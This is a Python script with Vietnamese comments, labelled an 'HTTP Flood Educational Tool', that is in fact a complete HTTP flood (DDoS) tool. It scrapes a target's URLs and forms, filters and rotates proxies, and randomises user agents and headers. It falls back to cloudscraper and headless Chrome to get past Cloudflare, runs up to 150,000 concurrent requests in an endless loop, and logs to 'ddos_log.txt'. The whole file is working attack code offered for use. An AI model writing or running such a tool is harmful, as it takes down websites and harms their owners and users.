import sys
import importlib
import subprocess
import os
import random
import time
import requests
import aiohttp
import asyncio
import cloudscraper
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException, Timeout, ConnectionError
from sklearn.ensemble import RandomForestClassifier
from sklearn.utils.validation import check_is_fitted
import numpy as np
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import psutil
from collections import deque
from urllib.parse import urljoin

# Kiểm tra phiên bản Python
if sys.version_info < (3, 7):
    print("Yêu cầu Python 3.7 trở lên.")
    sys.exit(1)

# Kiểm tra pip
try:
    import pip
except ImportError:
    print("Lỗi: pip không được cài đặt. Vui lòng cài đặt pip trước.")
    sys.exit(1)

# Hàm kiểm tra và cài đặt module
def install_module(module_name, max_attempts=3):
    try:
        importlib.import_module(module_mappings.get(module_name, module_name))
        print(f"Module {module_name} đã được cài đặt.")
    except ImportError:
        print(f"Module {module_name} chưa được cài đặt. Đang cài đặt...")
        for attempt in range(max_attempts):
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
                print(f"Cài đặt {module_name} thành công.")
                return
            except subprocess.CalledProcessError:
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", module_name])
                    print(f"Cài đặt {module_name} thành công với --user.")
                    return
                except subprocess.CalledProcessError:
                    if attempt == max_attempts - 1:
                        print(f"Lỗi: Không thể cài đặt {module_name} sau {max_attempts} lần thử.")
                        print(f"Vui lòng cài đặt thủ công: pip install {module_name}")
                        sys.exit(1)
            time.sleep(1)

# Ánh xạ tên module trên PyPI và tên nhập trong Python
module_mappings = {
    "scikit-learn": "sklearn",
    "beautifulsoup4": "bs4",
    "webdriver-manager": "webdriver_manager",
    "tqdm": "tqdm"
}

# Danh sách module cần thiết
required_modules = [
    "requests",
    "aiohttp",
    "cloudscraper",
    "pystyle",
    "scikit-learn",
    "numpy",
    "beautifulsoup4",
    "selenium",
    "webdriver-manager",
    "tqdm"
]

# Cài đặt các module đồng thời
with ThreadPoolExecutor(max_workers=4) as executor:
    executor.map(install_module, required_modules)

# Nhập các module sau khi đảm bảo cài đặt
from pystyle import Colors, Colorate
from tqdm import tqdm

# Kiểm tra quyền ghi log
try:
    with open("ddos_log.txt", "a") as f:
        f.write("")
except PermissionError:
    print("Lỗi: Không có quyền ghi vào ddos_log.txt.")
    sys.exit(1)

# Kiểm tra quyền thực thi ChromeDriver
try:
    chromedriver_path = ChromeDriverManager().install()
    if not os.access(chromedriver_path, os.X_OK):
        print("Lỗi: ChromeDriver không có quyền thực thi. Vui lòng cấp quyền.")
        sys.exit(1)
except Exception as e:
    print(f"Lỗi khi cài đặt ChromeDriver: {str(e)}")
    sys.exit(1)

# Lớp quản lý proxy từ tệp proxies.txt
class ProxyManager:
    def __init__(self, proxy_file="proxies.txt"):
        self.proxy_file = proxy_file
        self.proxy_cache = deque()

    def load_proxies(self):
        try:
            if not os.path.exists(self.proxy_file):
                print(f"Lỗi: Tệp {self.proxy_file} không tồn tại.")
                sys.exit(1)
            with open(self.proxy_file, "r") as f:
                proxies = f.read().strip().splitlines()
            if not proxies:
                print(f"Lỗi: Tệp {self.proxy_file} rỗng.")
                sys.exit(1)
            return [f"http://{proxy.strip()}" if not proxy.strip().startswith("http") else proxy.strip() for proxy in proxies if proxy.strip()]
        except PermissionError:
            print(f"Lỗi: Không có quyền đọc tệp {self.proxy_file}.")
            sys.exit(1)
        except Exception as e:
            print(f"Lỗi khi đọc tệp {self.proxy_file}: {str(e)}")
            sys.exit(1)

    async def initialize(self):
        proxies = self.load_proxies()
        valid_proxies = []
        print("Đang kiểm tra proxy hoạt động...")
        
        # Kiểm tra tất cả proxy đồng thời với tqdm
        max_concurrent = len(proxies)  # Kiểm tra đồng thời tất cả proxy
        tasks = [self.test_proxy({"http": proxy, "https": proxy}) for proxy in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Cập nhật thanh tiến trình
        with tqdm(total=len(proxies), desc="Kiểm tra proxy", unit="proxy") as pbar:
            for proxy, result in zip(proxies, results):
                if isinstance(result, bool) and result:
                    valid_proxies.append(proxy)
                pbar.update(1)
        
        self.proxy_cache = deque(valid_proxies)
        print(f"Đã lọc, còn {len(self.proxy_cache)} proxy hoạt động.")
        with open("ddos_log.txt", "a") as f:
            f.write(f"[{time.ctime()}] Loaded and filtered {len(self.proxy_cache)} active proxies from {self.proxy_file}\n")

    async def get_proxy(self):
        if not self.proxy_cache:
            print("Hết proxy, tải lại...")
            await self.initialize()
            if not self.proxy_cache:
                print("Không thể tải proxy hoạt động. Dừng chương trình.")
                sys.exit(1)
        proxy = random.choice(self.proxy_cache)
        self.proxy_cache.remove(proxy)  # Xoay proxy
        self.proxy_cache.append(proxy)
        return {"http": proxy, "https": proxy}

    async def test_proxy(self, proxy):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://httpbin.org/ip", proxy=proxy["http"], timeout=3) as response:
                    return response.status == 200
        except:
            return False

# Danh sách 100 User-Agent thực tế
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
]

# Phân tích website để thu thập URL và biểu mẫu
def analyze_website(url):
    try:
        scraper = cloudscraper.create_scraper()
        response = scraper.get(url, headers={"User-Agent": random.choice(user_agents)}, timeout=5)
        if response.status_code in [403, 429]:
            print("Cloudflare phát hiện. Phân tích website thất bại.")
            return {"urls": [url], "forms": []}
        soup = BeautifulSoup(response.text, "html.parser")
        urls = []
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if href.startswith("/"):
                href = urljoin(url, href)
            if href.startswith(("http://", "https://")):
                urls.append(href)
        urls = list(dict.fromkeys(urls))  # Loại bỏ URL trùng lặp
        forms = [
            {"action": urljoin(url, form.get("action")) if form.get("action") else url, "inputs": [input.get("name") for input in form.find_all("input") if input.get("name")]}
            for form in soup.find_all("form")
        ]
        return {"urls": urls, "forms": forms}
    except RequestException as e:
        print(f"Lỗi phân tích website: {str(e)}")
        return {"urls": [url], "forms": []}

# AI để điều chỉnh tần suất yêu cầu
class RateOptimizer:
    def __init__(self):
        self.model = RandomForestClassifier(n_estimators=50)
        self.history = []

    def train(self, status_codes, success_labels):
        if len(status_codes) != len(success_labels) or len(status_codes) < 5:
            return
        X = np.array(status_codes).reshape(-1, 1)
        y = np.array(success_labels)
        self.model.fit(X, y)

    def predict_delay(self, status_code):
        if len(self.history) < 5:
            return random.uniform(0.05, 0.3)
        X = np.array([[status_code]])
        try:
            check_is_fitted(self.model)
        except NotFittedError:
            print("Model is not fitted yet. Training now.")
            status_codes, labels = zip(*self.history)
            self.train(status_codes, labels)
        prediction = self.model.predict(X)[0]
        return 0.05 if prediction == 1 else 0.3

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Diagonal(Colors.purple_to_blue, """
    ╔══════════════════════════════════════════════════════╗
    ║    HTTP Flood Educational Tool . Version 4.0 | Cre by: LIGHT ║
    ╚══════════════════════════════════════════════════════╝   

░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓████████▓▒░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
    """))

async def simulate_request(url, rate_optimizer, website_data, success_count, failure_count, proxy_manager, max_retries=5):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "application/json, text/javascript, */*; q=0.01",
            "*/*"
        ]),
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": random.choice(["gzip, deflate", "br", "gzip, deflate, br"]),
        "Connection": "keep-alive",
        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", url]),
        "Cache-Control": random.choice(["no-cache", "max-age=0"])
    }
    proxy = await proxy_manager.get_proxy()
    if not proxy:
        print("Không có proxy khả dụng. Bỏ qua yêu cầu.")
        failure_count[0] += 1
        rate_optimizer.history.append((503, 0))
        return None

    # Kiểm tra proxy trước khi sử dụng
    if not await proxy_manager.test_proxy(proxy):
        print(f"Proxy {proxy['http']} không hoạt động. Thử proxy khác.")
        proxy = await proxy_manager.get_proxy()
        if not proxy:
            print("Không có proxy khả dụng sau khi thử lại.")
            failure_count[0] += 1
            rate_optimizer.history.append((503, 0))
            return None

    # Chọn ngẫu nhiên hành vi (GET, POST, HEAD)
    action = random.choice(["get", "post", "head"]) if website_data["forms"] else random.choice(["get", "head"])
    target_url = random.choice(website_data["urls"]) if website_data["urls"] else url
    data = None
    if action == "post" and website_data["forms"]:
        form = random.choice(website_data["forms"])
        data = {input_name: "test" for input_name in form["inputs"]}

    for attempt in range(max_retries):
        try:
            async with aiohttp.ClientSession() as session:
                if action == "post" and data:
                    response = await session.post(
                        target_url,
                        headers=headers,
                        data=data,
                        proxy=proxy["http"],
                        timeout=3
                    )
                elif action == "head":
                    response = await session.head(
                        target_url,
                        headers=headers,
                        proxy=proxy["http"],
                        timeout=3
                    )
                else:
                    response = await session.get(
                        target_url,
                        headers=headers,
                        proxy=proxy["http"],
                        timeout=3
                    )
                status = response.status
                print(Colorate.Horizontal(Colors.red_to_white,
                    f"[Async] {action.upper()} thành công | URL: {target_url} | Status: {status} | Proxy: {proxy['http']}"))
                rate_optimizer.history.append((status, 1))
                success_count[0] += 1
                with open("ddos_log.txt", "a") as f:
                    f.write(f"[{time.ctime()}] Success | Action: {action} | Status: {status} | URL: {target_url} | Proxy: {proxy['http']}\n")
                return status
        except (Timeout, ConnectionError, aiohttp.ClientError) as e:
            error_msg = str(e) if str(e) else "Unknown error"
            print(Colorate.Horizontal(Colors.red_to_white,
                f"[Async] Lỗi: {error_msg} | Thử lại lần {attempt + 1}/{max_retries} | Proxy: {proxy['http']}"))
            rate_optimizer.history.append((429 if "429" in error_msg else 500, 0))
            failure_count[0] += 1
            with open("ddos_log.txt", "a") as f:
                f.write(f"[{time.ctime()}] Failure | Action: {action} | Error: {error_msg} | URL: {target_url} | Proxy: {proxy['http']}\n")
            if attempt == max_retries - 1:
                print(Colorate.Horizontal(Colors.red_to_white,
                    f"[Async] Bỏ qua yêu cầu sau {max_retries} lần thử."))
                # Thử Selenium nếu thất bại
                try:
                    options = webdriver.ChromeOptions()
                    options.add_argument("--headless")
                    options.add_argument(f"--proxy-server={proxy['http']}")
                    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
                    driver.get(target_url)
                    time.sleep(2)
                    status = 200 if driver.page_source else 500
                    driver.quit()
                    print(Colorate.Horizontal(Colors.green_to_white,
                        f"[Selenium] Thành công qua Headless Browser | URL: {target_url} | Status: {status}"))
                    rate_optimizer.history.append((status, 1))
                    success_count[0] += 1
                    with open("ddos_log.txt", "a") as f:
                        f.write(f"[{time.ctime()}] Success | Action: selenium | Status: {status} | URL: {target_url} | Proxy: {proxy['http']}\n")
                    return status
                except Exception as e:
                    error_msg = str(e) if str(e) else "Unknown error"
                    print(Colorate.Horizontal(Colors.red_to_white,
                        f"[Selenium] Lỗi Headless Browser: {error_msg} | URL: {target_url}"))
                    rate_optimizer.history.append((500, 0))
                    failure_count[0] += 1
                    with open("ddos_log.txt", "a") as f:
                        f.write(f"[{time.ctime()}] Failure | Action: selenium | Error: {error_msg} | URL: {target_url}\n")
            await asyncio.sleep(0.05)
        except Exception as e:
            error_msg = str(e) if str(e) else "Unknown error"
            print(Colorate.Horizontal(Colors.red_to_white,
                f"[Async] Lỗi bất ngờ: {error_msg} | URL: {target_url}"))
            rate_optimizer.history.append((500, 0))
            failure_count[0] += 1
            with open("ddos_log.txt", "a") as f:
                f.write(f"[{time.ctime()}] Unexpected Error: {error_msg} | URL: {target_url}\n")
            return None
    return None

def main():
    banner()
    print("\033[1;31m!!KHI NHẬP WEBSITE LƯU Ý PHẢI NHẬP https:// hoặc http://")
    url = input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] URL TEST WEBSITE: "))
    threads = int(input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] ENTER THREAD COUNT (1000-150000): ")))

    # Kiểm tra đầu vào
    import re
    if not re.match(r'^https?://', url):
        print(Colorate.Horizontal(Colors.red_to_white, "Lỗi: URL phải bắt đầu bằng http:// hoặc https://"))
        return
    if not (1000 <= threads <= 150000):
        print(Colorate.Horizontal(Colors.red_to_white, "Lỗi: Số luồng phải từ 1000 đến 150000"))
        return

    # Phân tích website
    print(Colorate.Horizontal(Colors.green_to_white, "Đang phân tích website..."))
    website_data = analyze_website(url)
    print(Colorate.Horizontal(Colors.green_to_white,
        f"Phân tích hoàn tất: {len(website_data['urls'])} URL, {len(website_data['forms'])} biểu mẫu"))

    rate_optimizer = RateOptimizer()
    proxy_manager = ProxyManager()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(proxy_manager.initialize())
    success_count = [0]
    failure_count = [0]

    async def run_requests():
        tasks = []
        for _ in range(threads):
            tasks.append(simulate_request(url, rate_optimizer, website_data, success_count, failure_count, proxy_manager))
        await asyncio.gather(*tasks)

    try:
        max_workers = min(150000, psutil.cpu_count() * 100)
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            while True:
                loop.run_until_complete(run_requests())
                if rate_optimizer.history:
                    status_codes, labels = zip(*rate_optimizer.history)
                    rate_optimizer.train(status_codes, labels)
                print(Colorate.Horizontal(Colors.green_to_white,
                    f"Thống kê: Thành công = {success_count[0]}, Thất bại = {failure_count[0]}"))
                last_status = rate_optimizer.history[-1][0] if rate_optimizer.history else 200
                delay = rate_optimizer.predict_delay(last_status)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_white, "\nĐã dừng chương trình bởi người dùng."))
        print(Colorate.Horizontal(Colors.green_to_white,
            f"Tổng kết: Thành công = {success_count[0]}, Thất bại = {failure_count[0]}"))

if __name__ == "__main__":
    main()
